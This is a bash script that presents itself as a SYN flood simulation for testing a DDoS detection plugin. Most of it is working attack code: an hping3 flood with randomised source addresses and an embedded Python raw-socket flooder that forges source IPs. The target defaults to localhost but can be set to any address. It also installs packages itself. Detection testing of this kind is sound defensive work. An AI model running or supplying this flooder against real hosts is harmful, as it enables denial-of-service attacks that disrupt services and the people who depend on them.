#!/bin/bash

# SYN Flood Attack Simulation Script
# This script simulates a SYN flood attack for testing the DDoS Inspector plugin

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}=== SYN Flood Attack Simulation ===${NC}"

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}This script must be run as root for raw socket access${NC}"
   exit 1
fi

# Default parameters
TARGET_IP="127.0.0.1"
TARGET_PORT="80"
ATTACK_DURATION="30"
PACKET_RATE="1000"
SOURCE_IP_RANGE="192.168.1"

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--target)
            TARGET_IP="$2"
            shift 2
            ;;
        -p|--port)
            TARGET_PORT="$2"
            shift 2
            ;;
        -d|--duration)
            ATTACK_DURATION="$2"
            shift 2
            ;;
        -r|--rate)
            PACKET_RATE="$2"
            shift 2
            ;;
        -s|--source-range)
            SOURCE_IP_RANGE="$2"
            shift 2
            ;;
        -h|--help)
            echo "Usage: $0 [OPTIONS]"
            echo "Options:"
            echo "  -t, --target      Target IP address (default: 127.0.0.1)"
            echo "  -p, --port        Target port (default: 80)"
            echo "  -d, --duration    Attack duration in seconds (default: 30)"
            echo "  -r, --rate        Packets per second (default: 1000)"
            echo "  -s, --source-range Source IP range prefix (default: 192.168.1)"
            echo "  -h, --help        Show this help message"
            exit 0
            ;;
        *)
            echo -e "${RED}Unknown option: $1${NC}"
            exit 1
            ;;
    esac
done

echo -e "${YELLOW}Target: ${TARGET_IP}:${TARGET_PORT}${NC}"
echo -e "${YELLOW}Duration: ${ATTACK_DURATION} seconds${NC}"
echo -e "${YELLOW}Rate: ${PACKET_RATE} packets/second${NC}"
echo -e "${YELLOW}Source IP range: ${SOURCE_IP_RANGE}.x${NC}"

# Check for required tools
if ! command -v hping3 &> /dev/null; then
    echo -e "${YELLOW}hping3 not found. Installing...${NC}"
    apt-get update && apt-get install -y hping3
fi

if ! command -v python3 &> /dev/null; then
    echo -e "${RED}Python3 not found. Please install python3${NC}"
    exit 1
fi

# Create Python script for advanced SYN flood
cat > /tmp/syn_flood.py << 'EOF'
#!/usr/bin/env python3
import socket
import random
import threading
import time
import sys
import struct

class SynFlooder:
    def __init__(self, target_ip, target_port, duration, rate, source_range):
        self.target_ip = target_ip
        self.target_port = int(target_port)
        self.duration = int(duration)
        self.rate = int(rate)
        self.source_range = source_range
        self.stop_flag = False
        
    def create_syn_packet(self, source_ip):
        # Create raw SYN packet
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # IP header
            version = 4
            ihl = 5
            tos = 0
            tot_len = 40  # IP header (20) + TCP header (20)
            id = random.randint(1, 65535)
            frag_off = 0
            ttl = 64
            protocol = socket.IPPROTO_TCP
            check = 0
            saddr = socket.inet_aton(source_ip)
            daddr = socket.inet_aton(self.target_ip)
            
            ihl_version = (version << 4) + ihl
            ip_header = struct.pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, 
                                  id, frag_off, ttl, protocol, check, saddr, daddr)
            
            # TCP header
            source_port = random.randint(1024, 65535)
            dest_port = self.target_port
            seq = random.randint(0, 4294967295)
            ack_seq = 0
            doff = 5
            flags = 2  # SYN flag
            window = socket.htons(5840)
            check = 0
            urg_ptr = 0
            
            doff_flags = (doff << 4) + flags
            tcp_header = struct.pack('!HHLLBBHHH', source_port, dest_port, seq,
                                   ack_seq, doff_flags, flags, window, check, urg_ptr)
            
            packet = ip_header + tcp_header
            sock.sendto(packet, (self.target_ip, 0))
            sock.close()
            return True
        except Exception as e:
            print(f"Error creating packet: {e}")
            return False
    
    def flood_worker(self):
        packets_sent = 0
        while not self.stop_flag:
            # Generate random source IP in the specified range
            source_ip = f"{self.source_range}.{random.randint(1, 254)}"
            
            if self.create_syn_packet(source_ip):
                packets_sent += 1
            
            # Rate limiting
            time.sleep(1.0 / self.rate if self.rate > 0 else 0.001)
        
        print(f"Thread finished. Packets sent: {packets_sent}")
    
    def start_flood(self):
        print(f"Starting SYN flood attack...")
        print(f"Target: {self.target_ip}:{self.target_port}")
        print(f"Duration: {self.duration} seconds")
        print(f"Rate: {self.rate} packets/second")
        
        # Start multiple threads for higher packet rate
        num_threads = min(10, max(1, self.rate // 100))
        threads = []
        
        for i in range(num_threads):
            thread = threading.Thread(target=self.flood_worker)
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        # Run for specified duration
        time.sleep(self.duration)
        self.stop_flag = True
        
        # Wait for threads to finish
        for thread in threads:
            thread.join(timeout=1)
        
        print("SYN flood attack completed")

if __name__ == "__main__":
    if len(sys.argv) != 6:
        print("Usage: python3 syn_flood.py <target_ip> <target_port> <duration> <rate> <source_range>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = sys.argv[2]
    duration = sys.argv[3]
    rate = sys.argv[4]
    source_range = sys.argv[5]
    
    flooder = SynFlooder(target_ip, target_port, duration, rate, source_range)
    flooder.start_flood()
EOF

# Warning message
echo -e "${RED}WARNING: This will generate attack traffic!${NC}"
echo -e "${RED}Only use this against systems you own or have permission to test!${NC}"
echo -e "${YELLOW}Press Ctrl+C to abort, or wait 5 seconds to continue...${NC}"
sleep 5

echo -e "${GREEN}Starting SYN flood attack...${NC}"

# Method 1: Using hping3 (if available and preferred)
if command -v hping3 &> /dev/null; then
    echo -e "${GREEN}Using hping3 for SYN flood...${NC}"
    timeout ${ATTACK_DURATION} hping3 -S -p ${TARGET_PORT} --flood --rand-source ${TARGET_IP} &
    HPING_PID=$!
fi

# Method 2: Using Python script
echo -e "${GREEN}Using Python script for SYN flood...${NC}"
python3 /tmp/syn_flood.py ${TARGET_IP} ${TARGET_PORT} ${ATTACK_DURATION} ${PACKET_RATE} ${SOURCE_IP_RANGE} &
PYTHON_PID=$!

# Progress indicator
for i in $(seq 1 ${ATTACK_DURATION}); do
    echo -ne "\r${GREEN}Attack progress: ${i}/${ATTACK_DURATION} seconds${NC}"
    sleep 1
done
echo

# Clean up
if [[ -n $HPING_PID ]]; then
    kill $HPING_PID 2>/dev/null || true
fi

wait $PYTHON_PID 2>/dev/null || true

# Clean up temporary files
rm -f /tmp/syn_flood.py

echo -e "${GREEN}SYN flood attack simulation completed!${NC}"
echo -e "${YELLOW}Check your DDoS Inspector logs for detection results.${NC}"

